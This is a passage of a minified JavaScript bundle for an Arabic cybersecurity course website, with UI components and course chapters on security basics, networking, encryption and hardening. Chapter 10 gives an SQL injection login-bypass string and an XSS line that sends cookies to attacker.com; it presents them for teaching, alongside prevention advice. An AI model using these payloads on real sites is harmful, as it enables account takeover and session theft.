d=N.forwardRef(({className:r,...f},p)=>N.createElement(d0,{ref:p,iconNode:u,className:qp(`lucide-${i0(tp(o))}`,`lucide-${o}`,r),...f}));return d.displayName=tp(o),d};const f0=[["path",{d:"m5 12 7-7 7 7",key:"hav0vg"}],["path",{d:"M12 19V5",key:"x0mq9r"}]],h0=Me("arrow-up",f0);const p0=[["path",{d:"m15.477 12.89 1.515 8.526a.5.5 0 0 1-.81.47l-3.58-2.687a1 1 0 0 0-1.197 0l-3.586 2.686a.5.5 0 0 1-.81-.469l1.514-8.526",key:"1yiouv"}],["circle",{cx:"12",cy:"8",r:"6",key:"1vp47v"}]],m0=Me("award",p0);const g0=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],Kl=Me("book-open",g0);const x0=[["path",{d:"M12 8V4H8",key:"hb8ula"}],["rect",{width:"16",height:"12",x:"4",y:"8",rx:"2",key:"enze0r"}],["path",{d:"M2 14h2",key:"vft8re"}],["path",{d:"M20 14h2",key:"4cs60a"}],["path",{d:"M15 13v2",key:"1xurst"}],["path",{d:"M9 13v2",key:"rq6x2g"}]],b0=Me("bot",x0);const v0=[["path",{d:"M12 20v-9",key:"1qisl0"}],["path",{d:"M14 7a4 4 0 0 1 4 4v3a6 6 0 0 1-12 0v-3a4 4 0 0 1 4-4z",key:"uouzyp"}],["path",{d:"M14.12 3.88 16 2",key:"qol33r"}],["path",{d:"M21 21a4 4 0 0 0-3.81-4",key:"1b0z45"}],["path",{d:"M21 5a4 4 0 0 1-3.55 3.97",key:"5cxbf6"}],["path",{d:"M22 13h-4",key:"1jl80f"}],["path",{d:"M3 21a4 4 0 0 1 3.81-4",key:"1fjd4g"}],["path",{d:"M3 5a4 4 0 0 0 3.55 3.97",key:"1d7oge"}],["path",{d:"M6 13H2",key:"82j7cp"}],["path",{d:"m8 2 1.88 1.88",key:"fmnt4t"}],["path",{d:"M9 7.13V6a3 3 0 1 1 6 0v1.13",key:"1vgav8"}]],Yp=Me("bug",v0);const y0=[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]],xc=Me("check",y0);const S0=[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]],A0=Me("chevron-left",S0);const T0=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],E0=Me("chevron-right",T0);const N0=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],ns=Me("clock",N0);const j0=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],Rc=Me("download",j0);const C0=[["path",{d:"M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",key:"1nclc0"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],Vp=Me("eye",C0);const w0=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]],ls=Me("file-text",w0);const R0=[["path",{d:"M10 20a1 1 0 0 0 .553.895l2 1A1 1 0 0 0 14 21v-7a2 2 0 0 1 .517-1.341L21.74 4.67A1 1 0 0 0 21 3H3a1 1 0 0 0-.742 1.67l7.225 7.989A2 2 0 0 1 10 14z",key:"sc7q7i"}]],M0=Me("funnel",R0);const D0=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",key:"13o1zl"}],["path",{d:"M2 12h20",key:"9i4pu4"}]],Pp=Me("globe",D0);const _0=[["path",{d:"M21.42 10.922a1 1 0 0 0-.019-1.838L12.83 5.18a2 2 0 0 0-1.66 0L2.6 9.08a1 1 0 0 0 0 1.832l8.57 3.908a2 2 0 0 0 1.66 0z",key:"j76jl0"}],["path",{d:"M22 10v6",key:"1lu8f3"}],["path",{d:"M6 12.5V16a6 3 0 0 0 12 0v-3.5",key:"1r8lef"}]],Xp=Me("graduation-cap",_0);const z0=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],Qp=Me("lock",z0);const O0=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],k0=Me("menu",O0);const H0=[["path",{d:"M2.992 16.342a2 2 0 0 1 .094 1.167l-1.065 3.29a1 1 0 0 0 1.236 1.168l3.413-.998a2 2 0 0 1 1.099.092 10 10 0 1 0-4.777-4.719",key:"1sd12s"}]],lp=Me("message-circle",H0);const L0=[["path",{d:"M10 12h4",key:"a56b0p"}],["path",{d:"M10 17h4",key:"pvmtpo"}],["path",{d:"M10 7h4",key:"1vgcok"}],["path",{d:"M18 12h2",key:"quuxs7"}],["path",{d:"M18 18h2",key:"4scel"}],["path",{d:"M18 6h2",key:"1ptzki"}],["path",{d:"M4 12h2",key:"1ltxp0"}],["path",{d:"M4 18h2",key:"1xrofg"}],["path",{d:"M4 6h2",key:"1cx33n"}],["rect",{x:"6",y:"2",width:"12",height:"20",rx:"2",key:"749fme"}]],Kp=Me("microchip",L0);const U0=[["path",{d:"m21 21-4.34-4.34",key:"14j7rj"}],["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}]],bc=Me("search",U0);const B0=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Zl=Me("shield",B0);const G0=[["path",{d:"M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z",key:"r04s7s"}]],q0=Me("star",G0);const Y0=[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]],V0=Me("user",Y0);const P0=[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["path",{d:"M16 3.128a4 4 0 0 1 0 7.744",key:"16gr8j"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}]],Zp=Me("users",P0);const X0=[["path",{d:"M12 20h.01",key:"zekei9"}],["path",{d:"M2 8.82a15 15 0 0 1 20 0",key:"dnpr2z"}],["path",{d:"M5 12.859a10 10 0 0 1 14 0",key:"1x1e6c"}],["path",{d:"M8.5 16.429a5 5 0 0 1 7 0",key:"1bycff"}]],Jp=Me("wifi",X0);const Q0=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],K0=Me("x",Q0);const Z0=[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]],Uo=Me("zap",Z0);function J0(){const[o,u]=N.useState(!1);N.useEffect(()=>{const r=()=>{u(window.scrollY>400)};return window.addEventListener("scroll",r,{passive:!0}),()=>window.removeEventListener("scroll",r)},[]);const d=()=>{window.scrollTo({top:0,behavior:"smooth"})};return i.jsx("button",{"code-path":"src/components/BackToTop.tsx:20:5",onClick:d,"aria-label":"العودة للأعلى",className:`fixed bottom-6 left-6 z-50 w-12 h-12 rounded-full bg-neon/10 border border-neon/30 
        flex items-center justify-center text-neon backdrop-blur-sm
        transition-all duration-300 hover:bg-neon/20 hover:scale-110 hover:shadow-neon
        ${o?"opacity-100 translate-y-0":"opacity-0 translate-y-4 pointer-events-none"}`,children:i.jsx(h0,{"code-path":"src/components/BackToTop.tsx:28:7",className:"w-5 h-5"})})}function W0(){const o=N.useRef(null);return N.useEffect(()=>{const u=o.current;if(!u)return;const d=u.getContext("2d");if(!d)return;let r,f=!0;const p=[],x=60,v=150,g=200;let m={x:-1e3,y:-1e3};const T=()=>{u.width=window.innerWidth,u.height=window.innerHeight},A=()=>{p.length=0;for(let q=0;q<x;q++)p.push({x:Math.random()*u.width,y:Math.random()*u.height,vx:(Math.random()-.5)*.5,vy:(Math.random()-.5)*.5,size:Math.random()*2+1})},z=()=>{if(f){d.clearRect(0,0,u.width,u.height);for(let q=0;q<p.length;q++){const L=p[q];L.x+=L.vx,L.y+=L.vy,(L.x<0||L.x>u.width)&&(L.vx*=-1),(L.y<0||L.y>u.height)&&(L.vy*=-1);const H=L.x-m.x,Z=L.y-m.y,I=Math.sqrt(H*H+Z*Z);if(I<g){const J=(g-I)/g;L.vx+=H/I*J*.3,L.vy+=Z/I*J*.3}d.beginPath(),d.arc(L.x,L.y,L.size,0,Math.PI*2),d.fillStyle=`rgba(0, 255, 0, ${.4+L.size*.15})`,d.fill();for(let J=q+1;J<p.length;J++){const se=p[J],ee=Math.sqrt((L.x-se.x)**2+(L.y-se.y)**2);if(ee<v){const ue=(1-ee/v)*.2;d.beginPath(),d.moveTo(L.x,L.y),d.lineTo(se.x,se.y),d.strokeStyle=`rgba(0, 255, 0, ${ue})`,d.lineWidth=.5,d.stroke()}}}r=requestAnimationFrame(z)}};T(),A(),z(),window.addEventListener("resize",()=>{T(),A()});const V=q=>{m.x=q.clientX,m.y=q.clientY};return window.addEventListener("mousemove",V),()=>{f=!1,cancelAnimationFrame(r),window.removeEventListener("mousemove",V)}},[]),i.jsx("canvas",{"code-path":"src/components/ParticleNetwork.tsx:106:5",ref:o,style:{position:"fixed",top:0,left:0,width:"100%",height:"100%",zIndex:0,pointerEvents:"none",opacity:.6}})}function xl({children:o}){return i.jsxs("div",{"code-path":"src/components/layout/Layout.tsx:14:5",className:"min-h-screen flex flex-col bg-background font-cairo",dir:"rtl",children:[i.jsx(o0,{"code-path":"src/components/layout/Layout.tsx:15:7"}),i.jsx(W0,{"code-path":"src/components/layout/Layout.tsx:16:7"}),i.jsx(n0,{"code-path":"src/components/layout/Layout.tsx:17:7"}),i.jsx("main",{"code-path":"src/components/layout/Layout.tsx:18:7",className:"flex-1 relative z-10",children:o}),i.jsx(s0,{"code-path":"src/components/layout/Layout.tsx:21:7"}),i.jsx(J0,{"code-path":"src/components/layout/Layout.tsx:22:7"})]})}function F0({opacity:o=.15}){const u=N.useRef(null);return N.useEffect(()=>{const d=u.current;if(!d)return;const r=d.getContext("2d");if(!r)return;let f,p=!0;const x=()=>{d.width=window.innerWidth,d.height=window.innerHeight};x(),window.addEventListener("resize",x);const v="01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン",g=14,m=Math.floor(d.width/g),T=Array(m).fill(0).map(()=>Math.random()*-100),A=()=>{if(p){r.fillStyle="rgba(2, 4, 2, 0.05)",r.fillRect(0,0,d.width,d.height),r.fillStyle="#0f0",r.font=`${g}px monospace`;for(let z=0;z<T.length;z++){const V=v[Math.floor(Math.random()*v.length)],q=z*g,L=T[z]*g,H=Math.random();H>.98?r.fillStyle="#fff":H>.9?r.fillStyle="#8fff8f":r.fillStyle=`rgba(0, 255, 0, ${.3+H*.7})`,r.fillText(V,q,L),L>d.height&&Math.random()>.975&&(T[z]=0),T[z]++}f=requestAnimationFrame(A)}};return A(),()=>{p=!1,cancelAnimationFrame(f),window.removeEventListener("resize",x)}},[]),i.jsx("canvas",{"code-path":"src/components/MatrixRain.tsx:78:5",ref:u,style:{position:"absolute",top:0,left:0,width:"100%",height:"100%",zIndex:0,opacity:o,pointerEvents:"none"}})}const I0=[{icon:"fa-route",value:"7",label:"مسار تعليمي"},{icon:"fa-book-open",value:"189+",label:"فصل تعليمي"},{icon:"fa-file-pdf",value:"7",label:"كتب PDF مجانية"},{icon:"fa-infinity",value:"∞",label:"دعم مستمر"}];function $0({target:o,inView:u}){const[d,r]=N.useState("0");return N.useEffect(()=>{if(!u)return;const f=o.match(/^\d+/);if(!f){r(o);return}const p=parseInt(f[0],10),x=o.replace(/^\d+/,""),v=2e3,g=60,m=p/g;let T=0,A=0;const z=setInterval(()=>{A++,T=Math.min(Math.round(m*A),p),r(T+x),A>=g&&(clearInterval(z),r(o))},v/g);return()=>clearInterval(z)},[u,o]),i.jsx(i.Fragment,{children:d})}function ev(){const o=N.useRef(null),[u,d]=N.useState(!1);return N.useEffect(()=>{const r=new IntersectionObserver(([f])=>{f.isIntersecting&&(d(!0),r.disconnect())},{threshold:.3});return o.current&&r.observe(o.current),()=>r.disconnect()},[]),i.jsx("section",{"code-path":"src/components/StatsSection.tsx:72:5",ref:o,className:"py-16 px-4 relative",children:i.jsx("div",{"code-path":"src/components/StatsSection.tsx:73:7",className:"max-w-6xl mx-auto",children:i.jsx("div",{"code-path":"src/components/StatsSection.tsx:74:9",className:"grid grid-cols-2 md:grid-cols-4 gap-6",children:I0.map((r,f)=>i.jsx("div",{"code-path":"src/components/StatsSection.tsx:76:13",className:"text-center group",style:{opacity:u?1:0,transform:u?"translateY(0)":"translateY(20px)",transition:`all 0.6s ease ${f*150}ms`},children:i.jsxs("div",{"code-path":"src/components/StatsSection.tsx:85:15",className:"glass-card rounded-4xl p-6 transition-all duration-300 hover:-translate-y-2 hover:border-neon/60",children:[i.jsx("i",{"code-path":"src/components/StatsSection.tsx:86:17",className:`fas ${r.icon} text-neon text-3xl mb-3 block group-hover:scale-110 transition-transform`}),i.jsx("div",{"code-path":"src/components/StatsSection.tsx:89:17",className:"text-3xl md:text-4xl font-black text-neon mb-1 neon-text",children:i.jsx($0,{"code-path":"src/components/StatsSection.tsx:90:19",target:r.value,inView:u})}),i.jsx("div",{"code-path":"src/components/StatsSection.tsx:92:17",className:"text-muted-foreground text-sm",children:r.label})]})},f))})})})}const tv={id:"basics",title:"أساسيات أمن المعلومات",emoji:"📘",color:"green",description:"منهج متكامل من 3 مستويات - من الصفر حتى الاحتراف",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~180 صفحة",icon:"fa-graduation-cap",chapters:[{number:1,title:"[مبتدئ] ما هو الأمن السيبراني؟ ومثلث CIA",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: مقدمة في الأمن السيبراني</h2>
        <p><strong>الهدف:</strong> فهم ماهية الأمن السيبراني وأهدافه الثلاثة الأساسية.</p>
        <div class="fig-box">
          <i class="fas fa-shield-alt text-neon text-4xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> مثلث CIA – حجر الزاوية في الأمن السيبراني
        </div>
        <p><strong>السرية (Confidentiality):</strong> ضمان عدم وصول غير المصرح لهم إلى المعلومات. مثال: التشفير، التحكم في الوصول.</p>
        <p><strong>التكامل (Integrity):</strong> التأكد من عدم تعديل البيانات بشكل غير مصرح به. مثال: التجزئات (Hashes)، التواقيع الرقمية.</p>
        <p><strong>التوفر (Availability):</strong> ضمان أن الأنظمة والبيانات متاحة عند الحاجة. مثال: النسخ الاحتياطي، خطط التعافي من الكوارث.</p>
        <div class="code-block">
# مفهوم التجزئة (Hashing) – مثال عملي باستخدام openssl
echo "MASRY STORE" > test.txt
openssl dgst -sha256 test.txt
# الناتج: SHA256(test.txt)= e4d7f1b4... (قيمة ثابتة الطول)
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> ابحث عن ثلاثة أمثلة واقعية لانتهاك السرية والتكامل والتوفر في الأخبار (مثل اختراق بيانات، تعديل موقع إلكتروني، انقطاع خدمة).
        </div>
      `},{number:2,title:"[مبتدئ] أنواع التهديدات والهجمات الشائعة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: من هم الخصوم؟</h2>
        <p>لفهم الدفاع، يجب معرفة الهجوم. الأنواع الأساسية:</p>
        <ul>
          <li><strong>التصيد الاحتيالي (Phishing):</strong> رسائل بريد إلكتروني مزيفة لسرقة بيانات الدخول. مثال: بريد من "البنك" يطلب تحديث بياناتك.</li>
          <li><strong>البرمجيات الخبيثة (Malware):</strong> فيروسات، أحصنة طروادة، برامج فدية، ديدان.</li>
          <li><strong>هجمات الوسيط (Man-in-the-Middle):</strong> اعتراض الاتصالات بين طرفين (مثل شبكة واي فاي عامة مزيفة).</li>
          <li><strong>هجمات الحرمان من الخدمة (DDoS):</strong> إغراق خادم بحركة مرور لجعله غير متاح.</li>
          <li><strong>الهندسة الاجتماعية (Social Engineering):</strong> خداع الأشخاص بدلاً من الأنظمة (مثال: اتصال هاتفي من "الدعم الفني").</li>
        </ul>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> هذه المعلومات لأغراض دفاعية فقط. لا تجربها على أنظمة لا تملك الإذن باختبارها.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 2:</strong> صف هجوماً واحداً من كل فئة، واقترح طريقة دفاعية بسيطة لمواجهته.
        </div>
      `},{number:3,title:"[مبتدئ] أساسيات الشبكات والبروتوكولات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: كيف تتحرك البيانات؟</h2>
        <p>لفهم هجمات الشبكات، تحتاج إلى أساسيات.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">نموذج OSI والطبقات السبع:</h3>
        <ul>
          <li>طبقة التطبيقات (7) – HTTP, SMTP, FTP.</li>
          <li>طبقة العرض (6) – تشفير البيانات.</li>
          <li>طبقة الجلسة (5) – إدارة الجلسات.</li>
          <li>طبقة النقل (4) – TCP, UDP.</li>
          <li>طبقة الشبكة (3) – IP, ICMP.</li>
          <li>طبقة ربط البيانات (2) – Ethernet, ARP.</li>
          <li>طبقة المادية (1) – الكابلات، الإشارات.</li>
        </ul>
        <p><strong>المنافذ الشائعة:</strong> 80 (HTTP)، 443 (HTTPS)، 22 (SSH)، 21 (FTP)، 53 (DNS)، 3389 (RDP).</p>
        <div class="code-block">
# أوامر عملية لاستكشاف الشبكة
ping google.com                     # اختبار الاتصال
tracert google.com                  # تتبع مسار الحزم (ويندوز)
nslookup masry0-store.vercel.app    # استعلام DNS
        </div>
        <div class="note-box">
          📌 <strong>نشاط 3:</strong> استخدم الأمر <code>netstat -an</code> على جهازك ولاحظ المنافذ المفتوحة. ما هي الخدمات التي تعتقد أنها تعمل عليها؟
        </div>
      `},{number:4,title:"[مبتدئ] أساسيات أنظمة التشغيل (ويندوز ولينكس)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: فهم بيئة العمل</h2>
        <p>سواء كنت تستخدم ويندوز أو لينكس، يجب أن تعرف أساسيات الحماية.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">لويندوز:</h3>
        <ul>
          <li>تحديث النظام بانتظام (Windows Update).</li>
          <li>تفعيل جدار الحماية Windows Defender و Microsoft Defender Antivirus.</li>
          <li>إعداد التحكم في حساب المستخدم (UAC).</li>
          <li>إنشاء مستخدم عادي (وليس مسؤولاً) للاستخدام اليومي.</li>
        </ul>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">للينكس (مثل Ubuntu):</h3>
        <ul>
          <li>تحديث النظام: <code>sudo apt update && sudo apt upgrade -y</code></li>
          <li>إدارة الصلاحيات: <code>sudo</code>, <code>chmod</code>, <code>chown</code>.</li>
          <li>تعطيل الخدمات غير الضرورية: <code>sudo systemctl disable bluetooth</code>.</li>
          <li>استخدام جدار الحماية: <code>sudo ufw enable</code>.</li>
        </ul>
        <div class="code-block">
# أوامر مهمة لتأمين لينكس
sudo ufw allow 22/tcp
sudo passwd -l root
sudo grep "Failed password" /var/log/auth.log
        </div>
        <div class="note-box">
          📌 <strong>نشاط 4:</strong> قم بتثبيت جهاز افتراضي لأوبونتو (باستخدام VirtualBox) وطبّق أوامر التحصين أعلاه.
        </div>
      `},{number:5,title:"[مبتدئ] التشفير (Cryptography) الأساسي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: كيف تحمي بياناتك؟</h2>
        <ul>
          <li><strong>التشفير المتماثل (Symmetric):</strong> مفتاح واحد للتشفير وفك التشفير (مثال: AES). يستخدم في تشفير الملفات والقرص الصلب.</li>
          <li><strong>التشفير اللامتماثل (Asymmetric):</strong> زوج مفاتيح (خاص وعام). يستخدم في التوقيع الرقمي وتبادل المفاتيح الآمن (مثال: RSA).</li>
          <li><strong>دوال التجزئة (Hashing):</strong> تحول البيانات إلى قيمة ثابتة الطول، لا يمكن الرجوع عنها (مثال: SHA-256). تستخدم للتحقق من التكامل ولتخزين كلمات المرور.</li>
        </ul>
        <div class="code-block">
# مثال: حساب تجزئة SHA-256 لملف
sha256sum myfile.txt

# مثال: تشفير متماثل باستخدام openssl
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -pass pass:mypassword

# فك التشفير
openssl enc -d -aes-256-cbc -in secret.enc -out secret_decrypted.txt -pass pass:mypassword
        </div>
        <div class="note-box">
          📌 <strong>نشاط 5:</strong> جرب تشفير ملف نصي باستخدام AES ثم فك تشفيره. ماذا يحدث إذا استخدمت كلمة مرور خاطئة؟
        </div>
      `},{number:6,title:"[مبتدئ] أمن كلمات المرور والمصادقة متعددة العوامل (MFA)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: حماية هويتك الرقمية</h2>
        <p>كلمات المرور هي خط الدفاع الأول، لكنها ضعيفة إذا لم تُدار بشكل صحيح.</p>
        <ul>
          <li>استخدم كلمات مرور طويلة (12 حرفاً على الأقل) وتحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.</li>
          <li>لا تعيد استخدام نفس كلمة المرور في حسابات متعددة.</li>
          <li>استخدم مدير كلمات مرور (مثل Bitwarden أو Keepass أو 1Password) لتخزينها بشكل آمن.</li>
          <li>فعّل المصادقة متعددة العوامل (MFA) حيثما أمكن (تطبيق Google Authenticator، Authy، أو رسائل SMS).</li>
        </ul>
        <div class="note-box">
          🔐 <strong>نشاط 6:</strong> اختر حساباً مهماً (مثل البريد الإلكتروني) وفعّل MFA باستخدام Google Authenticator. جرّب تسجيل الدخول مرة أخرى لتجربة العملية.
        </div>
      `},{number:7,title:"[مبتدئ] أمن الشبكات المنزلية والواي فاي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: تأمين منزلك الرقمي</h2>
        <ul>
          <li>قم بتغيير كلمة مرور جهاز الراوتر الافتراضية (عادة "admin/admin").</li>
          <li>استخدم تشفير WPA2 أو WPA3 (لا تستخدم WEP أو WPA القديم).</li>
          <li>قم بتعطيل WPS (Wi-Fi Protected Setup) لأنه ثغرة أمنية معروفة.</li>
          <li>أنشئ شبكة ضيف (Guest Network) للزوار.</li>
          <li>قم بتحديث ثابت (firmware) جهاز الراوتر بانتظام.</li>
          <li>غرّير اسم شبكة الواي فاي (SSID) ولا تستخدم اسماً يكشف عن نوع الراوتر أو عنوان منزلك.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-wifi text-neon text-2xl mb-2 block"></i>
          الشكل 7.1: إعدادات أمان الواي فاي – اختر WPA2 أو WPA3
        </div>
      `},{number:8,title:"[مبتدئ] حماية الأجهزة من البرامج الضارة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: الوقاية خير من العلاج</h2>
        <ul>
          <li>قم بتثبيت برنامج مكافحة فيروسات موثوق (Windows Defender كافٍ للمستخدم العادي).</li>
          <li>قم بتحديث برامجك ونظام التشغيل بانتظام (التصحيحات الأمنية).</li>
          <li>لا تقم بتحميل أو تشغيل ملفات من مصادر غير موثوقة (بريد عشوائي، مواقع قرصنة).</li>
          <li>قم بتعطيل تشغيل الماكرو في ملفات Office إذا لم تكن بحاجة إليه (الماكرو وسيلة شائعة لنشر الفيروسات).</li>
          <li>استخدم أداة فحص إضافية مثل Malwarebytes بشكل دوري.</li>
        </ul>
        <div class="note-box">
          📌 <strong>نشاط 8:</strong> افحص جهازك باستخدام أداة مضاد فيروسات (مثل Windows Defender Offline Scan).
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية لاختبار فهمك:</p>
        <ol>
          <li>اشرح مثلث CIA وأعط مثالاً واحداً لكل عنصر.</li>
          <li>ما الفرق بين التصيد الاحتيالي وهجوم الهندسة الاجتماعية؟</li>
          <li>ما هو أمر ping وماذا يفعل؟</li>
          <li>اكتب أمراً لتحديث نظام Ubuntu عبر الطرفية.</li>
          <li>ما الفرق بين التشفير المتماثل واللامتماثل؟</li>
          <li>لماذا تعتبر المصادقة متعددة العوامل مهمة حتى مع وجود كلمة مرور قوية؟</li>
          <li>ما هو إعداد WPA2 في إعدادات الراوتر؟</li>
          <li>اذكر ثلاث طرق لحماية جهازك من البرامج الضارة.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتأمين جهاز كمبيوتر منزلي (حقيقي أو افتراضي) بتطبيق ما تعلمته: تحديث النظام، تفعيل جدار الحماية، تثبيت برنامج مضاد فيروسات، إنشاء كلمة مرور قوية لجهاز الراوتر، وتشغيل MFA لحساب بريدك الإلكتروني. دوّن الخطوات التي اتبعتها في مستند.</p>
      `},{number:10,title:"[متوسط] أمن تطبيقات الويب – SQL Injection و XSS",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: تهديدات الويب الأكثر شيوعاً</h2>
        <p>تطبيقات الويب هي الهدف الأول للمخترقين. سنغطي ثغرتين أساسيتين.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">SQL Injection (حقن SQL)</h3>
        <p>استغلال عدم تنقية المدخلات للوصول إلى قاعدة البيانات. مثال: إدخال <code>' OR '1'='1' --</code> في حقل اسم المستخدم لتجاوز تسجيل الدخول.</p>
        <div class="code-block">
# مثال بسيط لاستعلام SQL ضعيف:
SELECT * FROM users WHERE username = '$username' AND password = '$password'

# إذا أدخل المهاجم: username = 'admin' --  يصبح الاستعلام:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Scripting (XSS)</h3>
        <p>حقن كود JavaScript في صفحات الويب لسرقة الجلسات أو تشويه المحتوى. مثال: <code>&lt;script&gt;alert('Hacked')&lt;/script&gt;</code></p>
        <div class="code-block">
# مثال لسرقة الكوكيز عبر XSS:
&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
        </div>
        <div class="note-box">
          🛡️ <strong>الوقاية:</strong> استخدم الاستعلامات المعلمة (Parameterized Queries) لمنع SQLi، وتنقية المخرجات (Output Encoding) لمنع XSS.
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تجرب هذه الأكواد على مواقع حقيقية دون إذن. استخدم منصات تدريب مثل PortSwigger Web Security Academy.
        </div>
      `},{number:11,title:"[متوسط] أمن الشبكات – جدران الحماية و IDS/IPS",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: أدوات الدفاع عن الشبكة</h2>
        <ul>
          <li><strong>جدار الحماية (Firewall):</strong> يصفف حركة المرور بناءً على قواعد (السماح/المنع).</li>
          <li><strong>نظام كشف التسلل (IDS):</strong> يراقب حركة المرور ويُصدر تنبيهاً عند اكتشاف هجوم (مثل Snort).</li>
          <li><strong>نظام منع التسلل (IPS):</strong> مثل IDS لكنه يمنع الهجوم تلقائياً.</li>
        </ul>
        <div class="code-block">
# تثبيت Snort IDS على Ubuntu
sudo apt install snort -y
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
# بعد التشغيل، حاول فحص جهازك (مثلاً باستخدام nmap) وسترى تنبيهات Snort.
        </div>
        <div class="fig-box">
          <i class="fas fa-chart-line text-neon text-2xl mb-2 block"></i>
          الشكل 11.1: آلية عمل IDS/IPS
        </div>
      `},{number:12,title:"[متوسط] إدارة السجلات وتحليلها – أساسيات SIEM",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: عيون الأمن – جمع وتحليل السجلات</h2>
        <p>SIEM (Security Information and Event Management) يجمع السجلات من مصادر متعددة ويكشف الأنماط الشاذة.</p>
        <ul>
          <li><strong>سجلات ويندوز الرئيسية:</strong> Security (أحداث المصادقة)، System، Application.</li>
